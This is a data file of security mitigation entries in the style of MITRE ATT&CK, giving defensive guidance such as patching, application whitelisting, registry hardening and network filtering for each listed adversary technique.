Exploitation for Defense Evasion Mitigation,"Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, if available. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion.",course_of_action
Exploitation for Privilege Escalation Mitigation,"Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, if available. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility and may not work for software components targeted for privilege escalation.",course_of_action
Exploitation of Remote Services Mitigation,"Segment networks and systems appropriately to reduce access to critical systems and services to controlled methods. Minimize available services to only those that are necessary. Regularly scan the internal network for available services to identify new and potentially vulnerable services. Minimize permissions and access for service accounts to limit impact of exploitation.

Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, if available. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)

Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. (Citation: TechNet Moving Beyond EMET) Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. (Citation: Wikipedia Control Flow Integrity) Many of these protections depend on the architecture and target application binary for compatibility and may not work for all software or services targeted.",course_of_action
External Remote Services Mitigation,"Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems. Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls. Disable or block remotely available services such as . Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of  techniques for some two-factor authentication implementations.",course_of_action
Extra Window Memory Injection Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of operating system design features. For example, mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software (i.e., security products) from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior.

Although EWM injection may be used to evade certain types of defenses, it is still good practice to identify potentially malicious software that may be used to perform adversarial actions and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Fallback Channels Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
File Deletion Mitigation,"Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to delete files, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
File System Logical Offsets Mitigation,"Identify potentially malicious software that may be used to access logical drives in this manner, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
File System Permissions Weakness Mitigation,"Use auditing tools capable of detecting file system permissions abuse opportunities on systems within an enterprise and correct them. Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for service file system permissions weaknesses. (Citation: Powersploit)

Identify and block potentially malicious software that may be executed through abuse of file, directory, and service permissions by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown programs. Deny execution from user directories such as file download directories and temp directories where able. (Citation: Seclists Kanthak 7zip Installer)

Turn off UAC's privilege elevation for standard users <code>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]</code>to automatically deny elevation requests, add: <code>""ConsentPromptBehaviorUser""=dword:00000000</code> (Citation: Seclists Kanthak 7zip Installer). Consider enabling installer detection for all users by adding: <code>""EnableInstallerDetection""=dword:00000001</code>. This will prompt for a password for installation and also log the attempt. To disable installer detection, instead add: <code>""EnableInstallerDetection""=dword:00000000</code>. This may prevent potential elevation of privileges through exploitation during the process of UAC detecting the installer, but will allow the installation process to continue without being logged.",course_of_action
File and Directory Discovery Mitigation,"File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Filter Network Traffic,Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.,course_of_action
Firmware Corruption Mitigation,Prevent adversary access to privileged accounts or access necessary to perform this technique. Check the integrity of the existing BIOS and device firmware to determine if it is vulnerable to modification. Patch the BIOS and other firmware as necessary to prevent successful use of known vulnerabilities. ,course_of_action
Forced Authentication Mitigation,"Block SMB  traffic from exiting an enterprise network with egress filtering or by blocking TCP ports 139, 445 and UDP port 137. Filter or block WebDAV protocol traffic from exiting the network. If access to external resources over SMB and WebDAV is necessary, then traffic should be tightly limited with whitelisting. (Citation: US-CERT SMB Security) (Citation: US-CERT APT Energy Oct 2017)

For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.

Use strong passwords to increase the difficulty of credential hashes from being cracked if they are obtained.",course_of_action
Gatekeeper Bypass Mitigation,"Other tools should be used to supplement Gatekeeper's functionality. Additionally, system settings can prevent applications from running that haven't been downloaded through the Apple Store which can help mitigate some of these issues.",course_of_action
Graphical User Interface Mitigation,"Prevent adversaries from gaining access to credentials through Credential Access that can be used to log into remote desktop sessions on systems.

Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to log into remote interactive sessions, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) and Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Group Policy Modification Mitigation,"Identify and correct GPO permissions abuse opportunities (ex: GPO modification privileges) using auditing tools such as Bloodhound (version 1.5.1 and later)(Citation: GitHub Bloodhound).

Consider implementing WMI and security filtering to further tailor which users and computers a GPO will apply to.(Citation: Wald0 Guide to GPOs)(Citation: Microsoft WMI Filters)(Citation: Microsoft GPO Security Filtering)",course_of_action
HISTCONTROL Mitigation,"Prevent users from changing the <code>HISTCONTROL</code> environment variable (Citation: Securing bash history). Also, make sure that the <code>HISTCONTROL</code> environment variable is set to “ignoredup” instead of “ignoreboth” or “ignorespace”.",course_of_action
Hardware Additions Mitigation,"Establish network access control policies, such as using device certificates and the 802.1x standard. (Citation: Wikipedia 802.1x) Restrict use of DHCP to registered devices to prevent unregistered devices from communicating with trusted systems. 

Block unknown devices and accessories by endpoint security configuration and monitoring agent.",course_of_action
Hidden Files and Directories Mitigation,Mitigation of this technique may be difficult and unadvised due to the the legitimate use of hidden files and directories.,course_of_action
Hidden Users Mitigation,"If the computer is domain joined, then group policy can help restrict the ability to create or hide users. Similarly, preventing the modification of the <code>/Library/Preferences/com.apple.loginwindow</code> <code>Hide500Users</code> value will force all users to be visible.",course_of_action
Hidden Window Mitigation,Whitelist programs that are allowed to have this plist tag. All other programs should be considered suspicious.,course_of_action
Hooking Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of operating system design features. For example, mitigating all hooking will likely have unintended side effects, such as preventing legitimate software (i.e., security products) from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior.",course_of_action
Hypervisor Mitigation,Prevent adversary access to privileged accounts necessary to install a hypervisor.,course_of_action
Image File Execution Options Injection Mitigation,"This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of operating system design features. For example, mitigating all IFEO will likely have unintended side effects, such as preventing legitimate software (i.e., security products) from operating properly. (Citation: Microsoft IFEOorMalware July 2015) Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying subsequent malicious behavior.

Identify and block potentially malicious software that may be executed through IFEO by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown executables.",course_of_action
Indicator Blocking Mitigation,"Ensure event tracers/forwarders (Citation: Microsoft ETW May 2018), firewall policies, and other associated mechanisms are secured with appropriate permissions and access controls. Consider automatically relaunching forwarding mechanisms at recurring intervals (ex: temporal, on-logon, etc.) as well as applying appropriate change management to firewall rules and other related system configurations.",course_of_action
Indicator Removal from Tools Mitigation,"Mitigation is difficult in instances like this because the adversary may have access to the system through another channel and can learn what techniques or tools are blocked by resident defenses. Exercising best practices with configuration and security as well as ensuring that proper process is followed during investigation of potential compromise is essential to detecting a larger intrusion through discrete alerts.

Identify and block potentially malicious software that may be used by an adversary by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Indicator Removal on Host Mitigation,"Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system. Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities. Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary.",course_of_action
Indirect Command Execution Mitigation,"Identify or block potentially malicious software that may contain abusive functionality by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP). These mechanisms can also be used to disable and/or limit user access to Windows utilities and file types/locations used to invoke malicious execution.(Citation: SpectorOPs SettingContent-ms Jun 2018)",course_of_action
Inhibit System Recovery Mitigation,"Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. 

Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data.(Citation: Ready.gov IT DRP) Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery.

Identify potentially malicious software and audit and/or block it by using whitelisting(Citation: Beechey 2010) tools, like AppLocker,(Citation: Windows Commands JPCERT)(Citation: NSA MS AppLocker) or Software Restriction Policies(Citation: Corio 2008) where appropriate.(Citation: TechNet Applocker vs SRP)",course_of_action
Input Prompt Mitigation,"This technique exploits users' tendencies to always supply credentials when prompted, which makes it very difficult to mitigate. Use user training as a way to bring awareness and raise suspicion for potentially malicious events (ex: Office documents prompting for credentials).",course_of_action
Install Root Certificate Mitigation,"HTTP Public Key Pinning (HPKP) is one method to mitigate potential man-in-the-middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate. (Citation: Wikipedia HPKP)

Windows Group Policy can be used to manage root certificates and the <code>Flags</code> value of <code>HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\ProtectedRoots</code> can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store. (Citation: SpectorOps Code Signing Dec 2017)",course_of_action
InstallUtil Mitigation,InstallUtil may not be necessary within a given environment. Use application whitelisting configured to block execution of InstallUtil.exe if it is not required for a given system or network to prevent potential misuse by adversaries.,course_of_action
Kerberoasting Mitigation,"Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. (Citation: AdSecurity Cracking Kerberos Dec 2015) Also consider using Group Managed Service Accounts or another third party product such as password vaulting. (Citation: AdSecurity Cracking Kerberos Dec 2015)

Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators. (Citation: AdSecurity Cracking Kerberos Dec 2015)

Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible. (Citation: AdSecurity Cracking Kerberos Dec 2015)",course_of_action
Kernel Modules and Extensions Mitigation,"Common tools for detecting Linux rootkits include: rkhunter (Citation: SourceForge rkhunter), chrootkit (Citation: Chkrootkit Main), although rootkits may be designed to evade certain detection tools.

LKMs and Kernel extensions require root level permissions to be installed. Limit access to the root account and prevent users from loading kernel modules and extensions through proper privilege separation and limiting Privilege Escalation opportunities.

Application whitelisting and software restriction tools, such as SELinux, can also aide in restricting kernel module loading. (Citation: Kernel.org Restrict Kernel Module)",course_of_action
Keychain Mitigation,The password for the user's login keychain can be changed from the user's login password. This increases the complexity for an adversary because they need to know an additional password.,course_of_action
LC_LOAD_DYLIB Addition Mitigation,"Enforce that all binaries be signed by the correct Apple Developer IDs, and whitelist applications via known hashes. Binaries can also be baselined for what dynamic libraries they require, and if an app requires a new dynamic library that wasn’t included as part of an update, it should be investigated.",course_of_action
LC_MAIN Hijacking Mitigation,Enforce valid digital signatures for signed code on all applications and only trust applications with signatures from trusted parties.,course_of_action
LLMNR/NBT-NS Poisoning Mitigation,"Disable LLMNR and NetBIOS in local computer security settings or by group policy if they are not needed within an environment. (Citation: ADSecurity Windows Secure Baseline)

Use host-based security software to block LLMNR/NetBIOS traffic. Enabling SMB Signing can stop NTLMv2 relay attacks.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)(Citation: Microsoft SMB Packet Signing)",course_of_action
LSASS Driver Mitigation,"On Windows 8.1 and Server 2012 R2, enable LSA Protection by setting the Registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL</code> to <code>dword:00000001</code>. (Citation: Microsoft LSA Protection Mar 2014) LSA Protection ensures that LSA plug-ins and drivers are only loaded if they are digitally signed with a Microsoft signature and adhere to the Microsoft Security Development Lifecycle (SDL) process guidance.

On Windows 10 and Server 2016, enable Windows Defender Credential Guard (Citation: Microsoft Enable Cred Guard April 2017) to run lsass.exe in an isolated virtualized environment without any device drivers. (Citation: Microsoft Credential Guard April 2017)

Ensure safe DLL search mode is enabled <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode</code> to mitigate risk that lsass.exe loads a malicious code library. (Citation: Microsoft DLL Security)",course_of_action
Launch Agent Mitigation,Restrict user's abilities to create Launch Agents with group policy.,course_of_action
Launch Daemon Mitigation,Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons.,course_of_action
Launchctl Mitigation,Prevent users from installing their own launch agents or launch daemons and instead require them to be pushed out by group policy.,course_of_action
Limit Access to Resource Over Network,"Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.",course_of_action
Limit Hardware Installation,"Block users or groups from installing or using unapproved hardware on systems, including USB devices.",course_of_action
Limit Software Installation,Block users or groups from installing unapproved software.,course_of_action
Local Job Scheduling Mitigation,Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized users can create scheduled jobs. Identify and block unnecessary system utilities or potentially malicious software that may be used to schedule jobs using whitelisting tools.,course_of_action
Login Item Mitigation,"Restrict users from being able to create their own login items. Additionally, holding the shift key during login prevents apps from opening automatically (Citation: Re-Open windows on Mac).",course_of_action
Logon Scripts Mitigation,"Restrict write access to logon scripts to specific administrators. Prevent access to administrator accounts by mitigating Credential Access techniques and limiting account access and permissions of .

Identify and block potentially malicious software that may be executed through logon script modification by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown programs.",course_of_action
Man in the Browser Mitigation,"Since browser pivoting requires a high integrity process to launch from, restricting user permissions and addressing Privilege Escalation and  opportunities can limit the exposure to this technique. 

Close all browser sessions regularly and when they are no longer needed.",course_of_action
Masquerading Mitigation,"When creating security rules, avoid exclusions based on file name or file path. Require signed binaries. Use file system access controls to protect folders such as C:\Windows\System32. Use tools that restrict program execution via whitelisting by attributes other than file name.

Identify potentially malicious software that may look like a legitimate program based on name and location, and audit and/or block it by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Modify Existing Service Mitigation,"Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them. Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations. Toolkits like the PowerSploit framework contain the PowerUp modules that can be used to explore systems for Privilege Escalation weaknesses. (Citation: Powersploit)

Identify and block potentially malicious software that may be executed through service abuse by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) that are capable of auditing and/or blocking unknown programs.",course_of_action
Modify Registry Mitigation,"Misconfiguration of permissions in the Registry may lead to opportunities for an adversary to execute code, like through . Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation.

Identify and block unnecessary system utilities or potentially malicious software that may be used to modify the Registry by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Mshta Mitigation,Mshta.exe may not be necessary within a given environment since its functionality is tied to older versions of Internet Explorer that have reached end of life. Use application whitelisting configured to block execution of mshta.exe if it is not required for a given system or network to prevent potential misuse by adversaries.,course_of_action
Multi-Stage Channels Mitigation,"Command and control infrastructure used in a multi-stage channel may be blocked if known ahead of time. If unique signatures are present in the C2 traffic, they could also be used as the basis of identifying and blocking the channel. (Citation: University of Birmingham C2)",course_of_action
Multi-factor Authentication,Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.,course_of_action
Multi-hop Proxy Mitigation,Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network black and white lists. It should be noted that this kind of blocking may be circumvented by other techniques like .,course_of_action
Multiband Communication Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)",course_of_action
Multilayer Encryption Mitigation,"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often. (Citation: University of Birmingham C2)",course_of_action
NTFS File Attributes Mitigation,"It may be difficult or inadvisable to block access to EA and ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Symantec ADS May 2009) Efforts should be focused on preventing potentially malicious software from running. Identify and block potentially malicious software that may contain functionality to hide information in EA and ADSs by using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)

Consider adjusting read and write permissions for NTFS EA, though this should be tested to ensure routine OS operations are not impeded. (Citation: InsiderThreat NTFS EA Oct 2017)",course_of_action
Netsh Helper DLL Mitigation,Identify and block potentially malicious software that may persist in this manner by using whitelisting (Citation: Beechey 2010) tools capable of monitoring DLL loads by Windows utilities like AppLocker. (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker),course_of_action
Network Denial of Service Mitigation,"When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.(Citation: CERT-EU DDoS March 2017)

Depending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.(Citation: CERT-EU DDoS March 2017)

As immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents.(Citation: CERT-EU DDoS March 2017)",course_of_action
Network Intrusion Prevention,Use intrusion detection signatures to block traffic at network boundaries.,course_of_action
Network Segmentation,"Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.",course_of_action
Network Service Scanning Mitigation,"Use network intrusion detection/prevention systems to detect and prevent remote service scans. Ensure that unnecessary ports and services are closed and proper network segmentation is followed to protect critical servers and devices.

Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services running on remote systems, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Network Share Connection Removal Mitigation,"Follow best practices for mitigation of activity related to establishing . 

Identify unnecessary system utilities or potentially malicious software that may be used to leverage network shares, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Network Share Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Network Sniffing Mitigation,"Ensure that all wireless traffic is encrypted appropriately. Use Kerberos, SSL, and multifactor authentication wherever possible. Monitor switches and network for span port usage, ARP/DNS poisoning, and router reconfiguration.

Identify and block potentially malicious software that may be used to sniff or analyze network traffic by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
New Service Mitigation,"Limit privileges of user accounts and remediate Privilege Escalation vectors so only  authorized administrators can create new services.

Identify and block unnecessary system utilities or potentially malicious software that may be used to create services by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Operating System Configuration,Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.,course_of_action
Pass the Hash Mitigation,"Monitor systems and domain logs for unusual credential logon activity. Prevent access to . Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. 

Enable pass the hash mitigations to apply UAC restrictions to local accounts on network logon. The associated Registry key is located <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> Through GPO: Computer Configuration > [Policies] > Administrative Templates > SCM: Pass the Hash Mitigations: Apply UAC restrictions to local accounts on network logons. (Citation: GitHub IAD Secure Host Baseline UAC Filtering)

Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform Lateral Movement between systems. Ensure that built-in and created local administrator accounts have complex, unique passwords. Do not allow a domain user to be in the local administrator group on multiple systems.",course_of_action
Pass the Ticket Mitigation,"Monitor domains for unusual credential logons. Limit credential overlap across systems to prevent the damage of credential compromise. Ensure that local administrator accounts have complex, unique passwords. Do not allow a user to be a local administrator for multiple systems. Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts. (Citation: ADSecurity AD Kerberos Attacks)

For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. (Citation: CERT-EU Golden Ticket Protection)

Attempt to identify and block unknown or malicious software that could be used to obtain Kerberos tickets and use them to authenticate by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Password Filter DLL Mitigation,Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\Windows\System32\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages</code>. (Citation: Microsoft Install Password Filter n.d),course_of_action
Password Policies,Set and enforce secure password policies for accounts.,course_of_action
Password Policy Discovery Mitigation,Mitigating discovery of password policies is not advised since the information is required to be known by systems and users of a network. Ensure password policies are such that they mitigate brute force attacks yet will not give an adversary an information advantage because the policies are too light. Active Directory is a common way to set and enforce password policies throughout an enterprise network. (Citation: Microsoft Password Complexity),course_of_action
Path Interception Mitigation,"Eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them (Citation: Microsoft CreateProcess). Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate (Citation: MSDN DLL Security). Clean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries.

Periodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations (Citation: Kanthak Sentinel). 

Require that all executables be placed in write-protected directories. Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\Windows\</code>, to reduce places where malicious files could be placed for execution.

Identify and block potentially malicious software that may be executed through the path interception by using whitelisting (Citation: Beechey 2010) tools, like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies, (Citation: Corio 2008) that are capable of auditing and/or blocking unknown executables.",course_of_action
Peripheral Device Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Permission Groups Discovery Mitigation,"Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)",course_of_action
Plist Modification Mitigation,Prevent plist files from being modified by users by making them read-only.,course_of_action
Port Knocking Mitigation,"Mitigation of some variants of this technique could be achieved through the use of stateful firewalls, depending upon how it is implemented.",course_of_action
Port Monitors Mitigation,Identify and block potentially malicious software that may persist in this manner by using whitelisting (Citation: Beechey 2010) tools capable of monitoring DLL loads by processes running under SYSTEM permissions.,course_of_action
PowerShell Mitigation,"It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. (Citation: Netspi PowerShell Execution Policy Bypass) Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.",course_of_action
Pre-compromise,"This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.",course_of_action
